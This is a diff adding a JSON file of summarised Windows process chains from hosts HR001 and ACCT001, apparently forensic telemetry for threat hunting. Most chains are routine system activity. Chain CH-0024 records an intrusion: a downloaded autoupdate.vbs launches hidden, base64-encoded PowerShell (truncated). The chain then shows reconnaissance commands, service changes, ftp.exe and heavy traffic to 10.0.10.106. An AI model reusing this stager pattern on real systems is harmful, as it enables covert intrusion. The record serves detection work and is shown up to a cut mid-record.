@@ -1,0 +1,5182 @@
+[
+ {
+  "chain_id": "CH-0001",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:27.325000+00:00",
+  "end": "2019-05-14 22:31:28.868000+00:00",
+  "duration_s": 1.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 25,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0002",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:27.492000+00:00",
+  "end": "2019-05-14 22:32:29.594000+00:00",
+  "duration_s": 62.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 103,
+  "events_by_type": {
+   "image_load": 89,
+   "registry_event": 12,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0003",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:27.692000+00:00",
+  "end": "2019-05-14 22:32:28.605000+00:00",
+  "duration_s": 60.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 72,
+  "events_by_type": {
+   "image_load": 62,
+   "registry_event": 8,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0004",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:31:32.685000+00:00",
+  "end": "2019-05-14 22:37:18.386000+00:00",
+  "duration_s": 345.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 41,
+  "events_by_type": {
+   "image_load": 39,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k wsappx -p -s AppXSvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0005",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:31:34.069000+00:00",
+  "end": "2019-05-14 22:32:30.573000+00:00",
+  "duration_s": 56.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 68,
+  "events_by_type": {
+   "image_load": 35,
+   "file_create": 24,
+   "process_access": 8,
+   "process_create": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted"
+  ]
+ },
+ {
+  "chain_id": "CH-0006",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:31:34.869000+00:00",
+  "end": "2019-05-14 22:31:35.561000+00:00",
+  "duration_s": 0.7,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 30,
+   "process_create": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s BthAvctpSvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0007",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:31:36.926000+00:00",
+  "end": "2019-05-14 22:32:03.137000+00:00",
+  "duration_s": 26.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 43,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+  ]
+ },
+ {
+  "chain_id": "CH-0008",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:43.631000+00:00",
+  "end": "2019-05-14 22:32:18.696000+00:00",
+  "duration_s": 35.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 165,
+  "events_by_type": {
+   "image_load": 97,
+   "registry_event": 62,
+   "network_connect": 3,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "204.79.197.200:443 x2",
+   "72.21.91.29:80 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0009",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:46.579000+00:00",
+  "end": "2019-05-14 22:31:55.395000+00:00",
+  "duration_s": 8.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 24,
+  "events_by_type": {
+   "image_load": 22,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}"
+  ]
+ },
+ {
+  "chain_id": "CH-0010",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:47.016000+00:00",
+  "end": "2019-05-14 22:32:18.577000+00:00",
+  "duration_s": 31.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 166,
+  "events_by_type": {
+   "image_load": 96,
+   "registry_event": 64,
+   "network_connect": 3,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "204.79.197.200:443 x2",
+   "72.21.91.29:80 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0011",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:49.124000+00:00",
+  "end": "2019-05-14 22:32:18.751000+00:00",
+  "duration_s": 29.6,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 160,
+  "events_by_type": {
+   "image_load": 93,
+   "registry_event": 62,
+   "network_connect": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "204.79.197.200:443 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0012",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:56.732000+00:00",
+  "end": "2019-05-14 22:32:19.962000+00:00",
+  "duration_s": 23.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 144,
+  "events_by_type": {
+   "image_load": 101,
+   "registry_event": 30,
+   "file_create": 8,
+   "network_connect": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "10.0.10.106:999 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0013",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "windows.warp.jitservice.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:31:57.211000+00:00",
+  "end": "2019-05-14 22:32:26.127000+00:00",
+  "duration_s": 28.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 20,
+  "events_by_type": {
+   "image_load": 18,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => windows.warp.jitservice.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\Windows.WARP.JITService.exe 20ce08dd-7cb3-4733-bd9e-1c59a615ff5a S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194-2385269614-3243675-834220592-3"
+  ]
+ },
+ {
+  "chain_id": "CH-0014",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:31:57.483000+00:00",
+  "end": "2019-05-14 22:41:57.723000+00:00",
+  "duration_s": 600.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 33,
+  "events_by_type": {
+   "image_load": 30,
+   "process_create": 1,
+   "pipe_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s gpsvc"
+  ]
+ },
+ {
+  "chain_id": "CH-0015",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:31:59.132000+00:00",
+  "end": "2019-05-14 22:33:41.427000+00:00",
+  "duration_s": 102.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 33,
+  "events_by_type": {
+   "image_load": 31,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-2511471446-1103646877-3980648787-110625_ Global\\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-2511471446-1103646877-398064"
+  ]
+ },
+ {
+  "chain_id": "CH-0016",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:03.391000+00:00",
+  "end": "2019-05-14 22:32:19.654000+00:00",
+  "duration_s": 16.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 403,
+  "events_by_type": {
+   "registry_event": 186,
+   "image_load": 120,
+   "file_create": 85,
+   "network_connect": 9,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "65.216.231.192:443 x3",
+   "204.79.197.203:443 x2",
+   "204.79.197.200:443 x1",
+   "104.76.198.74:443 x1",
+   "72.30.2.182:443 x1"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0017",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "windows.warp.jitservice.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:03.909000+00:00",
+  "end": "2019-05-14 22:32:19.960000+00:00",
+  "duration_s": 16.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 20,
+  "events_by_type": {
+   "image_load": 18,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => windows.warp.jitservice.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\Windows.WARP.JITService.exe 20ce08de-7cb3-4733-bd9e-1c59a615ff5a S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194-3513710562-3729412521-18631535"
+  ]
+ },
+ {
+  "chain_id": "CH-0018",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:32:04.333000+00:00",
+  "end": "2019-05-14 22:32:23.253000+00:00",
+  "duration_s": 18.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 43,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+  ]
+ },
+ {
+  "chain_id": "CH-0019",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "sppsvc.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:32:05.616000+00:00",
+  "end": "2019-05-14 22:32:36.519000+00:00",
+  "duration_s": 30.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 44,
+  "events_by_type": {
+   "image_load": 38,
+   "registry_event": 2,
+   "process_access": 2,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => sppsvc.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\sppsvc.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0020",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "rundll32.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:15.144000+00:00",
+  "end": "2019-05-14 22:32:15.986000+00:00",
+  "duration_s": 0.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 33,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => rundll32.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": true,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0021",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:18.832000+00:00",
+  "end": "2019-05-14 22:32:19.823000+00:00",
+  "duration_s": 1.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 92,
+  "events_by_type": {
+   "image_load": 82,
+   "registry_event": 7,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0022",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedge.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:20.316000+00:00",
+  "end": "2019-05-14 22:32:45.855000+00:00",
+  "duration_s": 25.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 300,
+  "events_by_type": {
+   "registry_event": 152,
+   "image_load": 139,
+   "file_create": 6,
+   "process_access": 2,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => microsoftedge.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\MicrosoftEdge.exe\" -ServerName:MicrosoftEdge.AppXdnhjhccw3zf0j06tkg3jtqr00qdm0khc.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0023",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "browser_broker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:22.040000+00:00",
+  "end": "2019-05-14 22:32:28.074000+00:00",
+  "duration_s": 6.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 39,
+   "registry_event": 4,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => browser_broker.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\browser_broker.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0024",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "wscript.exe",
+  "root_parent": "explorer.exe",
+  "start": "2019-05-14 22:32:22.132000+00:00",
+  "end": "2019-05-14 23:47:44.225000+00:00",
+  "duration_s": 4522.1,
+  "n_processes": 93,
+  "max_depth": 6,
+  "n_events": 16008,
+  "events_by_type": {
+   "registry_event": 9110,
+   "image_load": 3349,
+   "network_connect": 2760,
+   "pipe_event": 366,
+   "process_access": 221,
+   "process_create": 93,
+   "process_terminate": 84,
+   "file_create": 24,
+   "other": 1
+  },
+  "narrative": "explorer.exe => wscript.exe (x2) -> powershell.exe (x6) -> conhost.exe (x6) -> route.exe -> ipconfig.exe -> whoami.exe (x2) -> qprocess.exe -> net.exe (x58) -> net1.exe (x6) -> netstat.exe (x2) -> reg.exe -> cmd.exe -> sc.exe (x4) -> recycler.exe -> ftp.exe",
+  "network_endpoints": [
+   "10.0.10.106:443 x2743",
+   "172.18.39.5:135 x5",
+   "172.18.39.5:53285 x4",
+   "172.18.39.5:389 x4",
+   "10.0.10.106:8080 x1"
+  ],
+  "any_encoded_cmd": true,
+  "notable": true,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\nmartha\\Downloads\\autoupdate.vbs\" ",
+   "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQ",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "\"C:\\Windows\\system32\\ROUTE.EXE\" print"
+  ]
+ },
+ {
+  "chain_id": "CH-0025",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "windows.warp.jitservice.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:22.371000+00:00",
+  "end": "2019-05-14 22:32:22.400000+00:00",
+  "duration_s": 0.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 18,
+  "events_by_type": {
+   "image_load": 17,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => windows.warp.jitservice.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\Windows.WARP.JITService.exe 20ce08df-7cb3-4733-bd9e-1c59a615ff5a S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194 S-1-5-21-2511471446-1103646877"
+  ]
+ },
+ {
+  "chain_id": "CH-0026",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgesh.exe",
+  "root_parent": "runtimebroker.exe",
+  "start": "2019-05-14 22:32:27.775000+00:00",
+  "end": "2019-05-14 22:32:33.014000+00:00",
+  "duration_s": 5.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 56,
+  "events_by_type": {
+   "image_load": 51,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "runtimebroker.exe => microsoftedgesh.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\MicrosoftEdgeSH.exe SCODEF:3468 CREDAT:9730 APH:7440000000009 JITHOST /prefetch:2"
+  ]
+ },
+ {
+  "chain_id": "CH-0027",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "microsoftedgecp.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:28.587000+00:00",
+  "end": "2019-05-14 22:32:45.860000+00:00",
+  "duration_s": 17.3,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 358,
+  "events_by_type": {
+   "registry_event": 201,
+   "image_load": 119,
+   "network_connect": 21,
+   "file_create": 15,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "svchost.exe => microsoftedgecp.exe",
+  "network_endpoints": [
+   "104.43.203.255:443 x3",
+   "96.17.191.26:443 x3",
+   "64.202.112.19:443 x3",
+   "204.79.197.200:443 x2",
+   "204.79.197.203:443 x2"
+  ],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\System32\\MicrosoftEdgeCP.exe\" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer"
+  ]
+ },
+ {
+  "chain_id": "CH-0028",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\LOCAL SERVICE",
+  "root_process": "windows.warp.jitservice.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:30.573000+00:00",
+  "end": "2019-05-14 22:32:30.594000+00:00",
+  "duration_s": 0.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 18,
+  "events_by_type": {
+   "image_load": 17,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => windows.warp.jitservice.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\Windows.WARP.JITService.exe 20ce08e0-7cb3-4733-bd9e-1c59a615ff5a S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194-3513710562-3729412521-18631535"
+  ]
+ },
+ {
+  "chain_id": "CH-0029",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "svchost.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:32:31.991000+00:00",
+  "end": "2019-05-14 22:32:50.859000+00:00",
+  "duration_s": 18.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 43,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => svchost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+  ]
+ },
+ {
+  "chain_id": "CH-0030",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\NETWORK SERVICE",
+  "root_process": "wmiprvse.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:32:37.706000+00:00",
+  "end": "2019-05-14 22:34:07.650000+00:00",
+  "duration_s": 89.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 83,
+  "events_by_type": {
+   "image_load": 68,
+   "registry_event": 10,
+   "pipe_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0031",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:33:49.771000+00:00",
+  "end": "2019-05-14 22:36:46.261000+00:00",
+  "duration_s": 176.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 47,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 3,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe4_ Global\\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0"
+  ]
+ },
+ {
+  "chain_id": "CH-0032",
+  "host": "ACCT001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 22:33:49.809000+00:00",
+  "end": "2019-05-14 22:36:46.266000+00:00",
+  "duration_s": 176.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 780 784 792 8192 788 "
+  ]
+ },
+ {
+  "chain_id": "CH-0033",
+  "host": "HR001",
+  "user": "SHIRE\\nmartha",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:37:03.031000+00:00",
+  "end": "2019-05-14 22:37:06.165000+00:00",
+  "duration_s": 3.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 31,
+  "events_by_type": {
+   "image_load": 29,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe Install $(Arg0)"
+  ]
+ },
+ {
+  "chain_id": "CH-0034",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "trustedinstaller.exe",
+  "root_parent": "services.exe",
+  "start": "2019-05-14 22:37:03.144000+00:00",
+  "end": "2019-05-14 22:39:09.013000+00:00",
+  "duration_s": 125.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 29,
+  "events_by_type": {
+   "image_load": 24,
+   "registry_event": 2,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "services.exe => trustedinstaller.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\servicing\\TrustedInstaller.exe"
+  ]
+ },
+ {
+  "chain_id": "CH-0035",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "tiworker.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 22:37:03.377000+00:00",
+  "end": "2019-05-14 22:39:09.143000+00:00",
+  "duration_s": 125.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 52,
+  "events_by_type": {
+   "image_load": 44,
+   "registry_event": 5,
+   "process_create": 1,
+   "process_access": 1,
+   "process_terminate": 1
+  },
+  "narrative": "svchost.exe => tiworker.exe",
+  "network_endpoints": [],
